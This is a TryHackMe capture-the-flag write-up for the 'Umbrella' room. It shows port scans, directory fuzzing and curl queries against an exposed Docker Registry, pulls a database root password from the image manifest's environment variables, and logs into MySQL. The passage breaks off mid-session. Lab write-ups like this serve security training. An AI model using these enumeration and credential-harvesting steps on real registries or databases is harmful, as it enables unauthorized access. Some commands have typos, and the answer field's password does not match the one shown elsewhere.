<h1 align="center">Umbrella</h1>
<p align="center">Jun 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 420-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
<em>Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerisation.</em>. <a href="https://tryhackme.com/room/umbrellae"</a>here.<br><br>
<img width="1000px" src=""></p>

<br>

<h2>Task 1 . Umbrealla</h2>

<p>Umbrella Corp has been developing a time-tracking application.<br>

See if you can find a way in.<br>

Please allow the machine 3 - 5 minutes to boot up fully.</p>

<h3>nmap</h3>
<p>

- <code>22</code> : <code>ssh</code> : <code>OpenSSH 8.2p1</code><br>
- <code>3306</code> : <code>mysql</code> : <code>MySQL 5.7.40</code><br>
- <code>5000</code> : <code>http</code> : <code>Docker Registry (API: 2.0)</code><br>
- <code>8080</code> : <code>http</code> : <code>Node.js</code></p>

```bash
:~/Umbrella# nmap -sC -sV TargetIP -T5
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: SwitchToSSLAfterHandshake, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongColumnFlag, Support41Auth, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongPassword, ConnectWithDatabase, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 
| \x04\x1D)1{O-\x189qa\x19\x01\x0B]\x04\x12\x07\x0F
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
```

```bash
:~/Umbrella# nmap -sC -sV -Pn -p- TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 6
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, LongPassword, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, LongColumnFlag, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, FoundRows, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1C#>|]V/`\x12W\x1B\x19O]uz.G^\x1B
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
g requests
|_http-title: Login
```

```bash
:~/Umbrella# nmap -A TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: InteractiveClient, ODBCClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, SwitchToSSLAfterHandshake, IgnoreSigpipes, ConnectWithDatabase, LongPassword, SupportsTransactions, Support41Auth, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x01h]\x11\x11k[vlX|8x\x07%\x1Dssg\x1F
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
```

<br>

<h3>gobuster</h3>

<p>
  
- <code>TargetIP:5000/v2</code><br></p>

```bash
:~/Umbrella# gobuster dir -u http://TargetIP:5000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 80
...
.                    (Status: 301) [Size: 0] [--> /]
/v2                  (Status: 301) [Size: 39] [
```

<br>

<p>
  
- <code>TargetIP:8080/css/</code></p>

```bash
:~/Umbrella# gobuster dir -u http://TargetIP:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 80
...
/css                  (Status: 301) [Size: 173] [--> /css/]
/.                    (Status: 301) [Size: 169] 
```

<br>

<h3>ffuf</h3>

```bash
:~/Umbrella# ffuf -u http://TargetIP:5000/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
...
.                       [Status: 301, Size: 0, Words: 1, Lines: 1]
v2                      [Status: 301, Size: 0, Words: 1, Lines: 1]
```

```bash
:~/Umbrella# fuf -u http://TargetIP:5000/v2/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
...
                        [Status: 301, Size: 0, Words: 1, Lines: 1]
_catalog                [Status: 200, Size: 43, Words: 1, Lines: 2]
```

<br>

```bash
:~/Umbrella# ffuf -u http://TargetIP:8080/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
...
auth                    [Status: 302, Size: 23, Words: 4, Lines: 1]
time                    [Status: 302, Size: 23, Words: 4, Lines: 1]
```

<br>

<h3>TargetIP:5000/v2/_catalog</h3>

<h3>curl</h3>


```bash
curl -s http://umbrella.thm:5000/v2/
{}
```

```bash
curl -s http://umbrella.thm:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

```bash
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}
```

![image](https://github.com/user-attachments/assets/a08c92a9-f962-425a-a7c6-97ef6b035439)


```bash
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list | jq
{
  "name": "umbrella/timetracking",
  "tags": [
    "latest"
  ]
}
```

<p>
  
-  DB_HOST=db
-  DB_USER=root
-  DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
-  DB_DATABASE=timetracking
-  LOG_FILE=/logs/tt.log\
-  Cmd\":[\"node\
-  app.js
-  Image : sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1
-  WprrkingDir : /usr/src/app
-  Entrypoint : docker-entrypoint.sh
-  container : 527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9
-  \",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-</p>

```bash
url -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest | jq
{
  "schemaVersion": 1,
  "name": "umbrella/timetracking",
  "tag": "latest",
  "architecture": "amd64",
  "fsLayers": [
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549"
    },
    {
      "blobSum": "sha256:62c454461c50ff8fb0d1c5d5ad8146203bb4505b30b9c27e6f05461b6d07edcb"
    },
    {
      "blobSum": "sha256:82f3f98b46d4129f725cab6326d0521589d5b75ae0a480256495d216b2cd9216"
    },
    {
      "blobSum": "sha256:e5e56a29478cdf60132aa574648135a89299151414b465942a569f2109eefa65"
    },
    {
      "blobSum": "sha256:7fbf137cf91ff826f2b2fddf3a30ea2e3d2e62d17525b708fd76db392e58df62"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:15b79dac86ef36668f382565f91d1667f7a6fc876a3b58b508b6778d8ed71c0e"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:23e2f216e8246d20ed3271ad109cec07f2a00b17bef8529708d8ae86100c7e03"
    },
    {
      "blobSum": "sha256:f897be510228b2f804fc2cb5d04cddae2e5689cbede553fb2d587c54be0ba762"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3241ece5841b2e29213eb450a1b29385bf9e0063c37978253c98ff517e6e1b3"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:00fde01815c92cc90586fcf531723ab210577a0f1cb1600f08d9f8e12c18f108"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:3f4ca61aafcd4fc07267a105067db35c0f0ac630e1970f3cd0c7bf552780e985"
    }
  ],
  "history": [
    {
      "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"node\",\"app.js\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":null},\"container\":\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-12-22T10:03:08.042002316Z\",\"docker_version\":\"20.10.17\",\"id\":\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\",\"os\":\"linux\",\"parent\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"parent\":\"0f4399d82c47d9cecdf2518e3ecb523bbd1936d4a45d4230f1184d81b2b4b40c\",\"created\":\"2022-12-22T10:03:07.855078938Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"0f4399d82c47d9cecdf2518e3ecb523bbd1936d4a45d4230f1184d81b2b4b40c\",\"parent\":\"f0c47bffb88d86d53eb843f6c4d28368c8bbe0aa7261893dcb2f32c5e504e3d1\",\"created\":\"2022-12-22T10:03:07.669136544Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:15724d44e98203ba3eb0cfac139970afa960a98d14ebe5255c867f410039dc6f in . \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"f0c47bffb88d86d53eb843f6c4d28368c8bbe0aa7261893dcb2f32c5e504e3d1\",\"parent\":\"61100ebd58404b5187aa8c0d4788ec64b9f376573ddc3ed1bdc8127dd804934c\",\"created\":\"2022-12-22T10:03:07.378466845Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY dir:f4893f0d1db8ba30964514f355012e263c0715cbc54c0ba03cb8c0e6c448501b in ./views \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"61100ebd58404b5187aa8c0d4788ec64b9f376573ddc3ed1bdc8127dd804934c\",\"parent\":\"9fed1d5f9c3156cf22eb8a501f1482b80ce417b2c114ea4d03149b56889547f7\",\"created\":\"2022-12-22T10:02:17.741096764Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY dir:b1f43f22176dce6e159da3d1f98a7c20f817e9a66b7a2a19a13cd0d3a0bc085c in ./public \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"9fed1d5f9c3156cf22eb8a501f1482b80ce417b2c114ea4d03149b56889547f7\",\"parent\":\"a073207a088b95f3345708ec0365a1f02c1400e96f28e16e1b410371e3b04c3c\",\"created\":\"2022-12-22T10:02:17.258347348Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c npm install\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"a073207a088b95f3345708ec0365a1f02c1400e96f28e16e1b410371e3b04c3c\",\"parent\":\"fd9e6932d7c9f1a9e53620c72101ef85a8c1b9051db767e9171bbedf958be114\",\"created\":\"2022-12-22T10:02:12.292565106Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY multi:8ea3cb977bb32fa75578a182b95f470d3c09488681d420f9d3418b8ab4e232ab in ./ \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"fd9e6932d7c9f1a9e53620c72101ef85a8c1b9051db767e9171bbedf958be114\",\"parent\":\"a736d9865b752b4c30c68719d04b5f5e404bd9302ab81a451a2b6679901ee50d\",\"created\":\"2022-12-22T10:02:12.074407159Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LOG_FILE=/logs/tt.log\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"a736d9865b752b4c30c68719d04b5f5e404bd9302ab81a451a2b6679901ee50d\",\"parent\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"created\":\"2022-12-22T10:02:11.849073942Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_DATABASE=timetracking\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"parent\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"created\":\"2022-12-22T10:02:11.638209337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"parent\":\"8b227f4d6cab8d95100554ab36684fc95ba5e1b28bf701351a70bf163a0835f6\",\"created\":\"2022-12-22T10:02:11.442849337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_USER=root\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"8b227f4d6cab8d95100554ab36684fc95ba5e1b28bf701351a70bf163a0835f6\",\"parent\":\"f603fc1e8f3e728e922ce8319cbfbf3e90f0f2e37ece699c71efdaca97d3eac3\",\"created\":\"2022-12-22T10:02:11.231525472Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_HOST=db\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"f603fc1e8f3e728e922ce8319cbfbf3e90f0f2e37ece699c71efdaca97d3eac3\",\"parent\":\"261dd8aecd9946db5cc3287d91024ae9e47c396793e61c954164c8275d42f4e2\",\"created\":\"2022-12-22T10:02:11.03433189Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/src/app\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"261dd8aecd9946db5cc3287d91024ae9e47c396793e61c954164c8275d42f4e2\",\"parent\":\"b8039dbc7f45c33f3811dbf25406ab4218aeb12feeb2fc4290e629cc2968f88e\",\"created\":\"2022-12-21T11:36:15.041971842Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"node\\\"]\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"b8039dbc7f45c33f3811dbf25406ab4218aeb12feeb2fc4290e629cc2968f88e\",\"parent\":\"d7d0dccf0d0aa6b5cdea32d2bad40c6115df1ab34ca433042e8d23e081d0a48d\",\"created\":\"2022-12-21T11:36:14.942169961Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENTRYPOINT [\\\"docker-entrypoint.sh\\\"]\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"d7d0dccf0d0aa6b5cdea32d2bad40c6115df1ab34ca433042e8d23e081d0a48d\",\"parent\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"created\":\"2022-12-21T11:36:14.843841635Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:4d192565a7220e135cab6c77fbc1c73211b69f3d9fb37e62857b2c6eb9363d51 in /usr/local/bin/ \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"parent\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"created\":\"2022-12-21T11:36:14.70919854Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex   \\u0026\\u0026 savedAptMark=\\\"$(apt-mark showmanual)\\\"   \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr --no-install-recommends   \\u0026\\u0026 rm -rf /var/lib/apt/lists/*   \\u0026\\u0026 for key in     6A010C5166006599AA17F08146C2130DFD2497F5   ; do     gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||     gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;   done   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz\\\"   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz.asc\\\"   \\u0026\\u0026 gpg --batch --verify yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 mkdir -p /opt   \\u0026\\u0026 tar -xzf yarn-v$YARN_VERSION.tar.gz -C /opt/   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarn /usr/local/bin/yarn   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarnpkg /usr/local/bin/yarnpkg   \\u0026\\u0026 rm yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null   \\u0026\\u0026 { [ -z \\\"$savedAptMark\\\" ] || apt-mark manual $savedAptMark \\u003e /dev/null; }   \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'     | awk '/=\\u003e/ { print $(NF-1) }'     | sort -u     | xargs -r dpkg-query --search     | cut -d: -f1     | sort -u     | xargs -r apt-mark manual   \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false   \\u0026\\u0026 yarn --version\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"parent\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"created\":\"2022-12-21T11:36:01.94635104Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV YARN_VERSION=1.22.19\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"parent\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"created\":\"2022-12-21T11:36:01.380484014Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c ARCH= \\u0026\\u0026 dpkgArch=\\\"$(dpkg --print-architecture)\\\"     \\u0026\\u0026 case \\\"${dpkgArch##*-}\\\" in       amd64) ARCH='x64';;       ppc64el) ARCH='ppc64le';;       s390x) ARCH='s390x';;       arm64) ARCH='arm64';;       armhf) ARCH='armv7l';;       i386) ARCH='x86';;       *) echo \\\"unsupported architecture\\\"; exit 1 ;;     esac     \\u0026\\u0026 set -ex     \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr xz-utils libatomic1 --no-install-recommends     \\u0026\\u0026 rm -rf /var/lib/apt/lists/*     \\u0026\\u0026 for key in       4ED778F539E3634C779C87C6D7062848A1AB005C       141F07595B7B3FFE74309A937405533BE57C7D57       74F12602B6F1C4E913FAA37AD3A89613643B6201       61FC681DFB92A079F1685E77973F295594EC4689       8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600       C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8       890C08DB8579162FEE0DF9DB8BEAB4DFCF555EF4       C82FA3AE1CBEDC6BE46B9360C43CEC45C17AB93C       108F52B48DB57BB0CC439B2997B01419BD92F80A     ; do       gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||       gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;     done     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\"     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\\\"     \\u0026\\u0026 gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc     \\u0026\\u0026 grep \\\" node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\\$\\\" SHASUMS256.txt | sha256sum -c -     \\u0026\\u0026 tar -xJf \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" -C /usr/local --strip-components=1 --no-same-owner     \\u0026\\u0026 rm \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" SHASUMS256.txt.asc SHASUMS256.txt     \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null     \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'       | awk '/=\\u003e/ { print $(NF-1) }'       | sort -u       | xargs -r dpkg-query --search       | cut -d: -f1       | sort -u       | xargs -r apt-mark manual     \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false     \\u0026\\u0026 ln -s /usr/local/bin/node /usr/local/bin/nodejs     \\u0026\\u0026 node --version     \\u0026\\u0026 npm --version\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"parent\":\"f9c56f52d7219e5ea722e07ff59d91d84931f65a282fb430b837586afb752adf\",\"created\":\"2022-12-21T11:35:38.095265392Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV NODE_VERSION=19.3.0\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"f9c56f52d7219e5ea722e07ff59d91d84931f65a282fb430b837586afb752adf\",\"parent\":\"c6361740242b1d2d4c6bf3f14b94cc06c3d1dd0b289c320d7406ed23e731b468\",\"created\":\"2022-12-21T11:35:37.993944015Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c groupadd --gid 1000 node   \\u0026\\u0026 useradd --uid 1000 --gid node --shell /bin/bash --create-home node\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"c6361740242b1d2d4c6bf3f14b94cc06c3d1dd0b289c320d7406ed23e731b468\",\"parent\":\"c9a25bc267d407595f101558484d56e017d42d0a8e9a4e41fac3a40435e26068\",\"created\":\"2022-12-21T01:20:33.000852514Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"c9a25bc267d407595f101558484d56e017d42d0a8e9a4e41fac3a40435e26068\",\"created\":\"2022-12-21T01:20:32.555983351Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:73e68ae6852c9afbb2989dc9c5b7c6668843f454b1bdcfb48658bfbc6c4af69e in / \"]}}"
    }
  ],
  "signatures": [
    {
      "header": {
        "jwk": {
          "crv": "P-256",
          "kid": "B4O4:W4LU:K46P:VHC4:I73V:ONTY:DLXJ:FZSD:IKUA:ULKM:HVKG:WXKZ",
          "kty": "EC",
          "x": "R4xclzK651MPdrn2QPX2IpVhRvNRE7Fm3CK80dzwPO8",
          "y": "Te5q4VJ8eenWDa4pIUkOFPrziH-vTL7O9yPYAkKmQNI"
        },
        "alg": "ES256"
      },
      "signature": "3dxpFo6J1s-jHtaFH6wSyQB6mTxLXIRrRJ90sD5CzrVsXaDDXvvySG0fJ_FEYIW6VHLg44waJPG2V8d6N_ebpg",
      "protected": "eyJmb3JtYXRMZW5ndGgiOjE2NDY2LCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjUtMDYtMzBUMTg6NDg6NDVaIn0"
    }
  ]
}
```

<h3 align="left">Answer the question below</h3>

> 1.1. <em>What is the DB password?</em><br><a id='1.1'></a>
>> <strong><code>Ng1-f3!Pe7-e5?Nf3xe5a</code></strong><br>


```bash
sudo apt install mysql-server
...

Ng1-f3!Pe7-e5?Nf3xe5

...

mysql -u root -p -h TargetIP
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.01 sec)

mysql> use timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

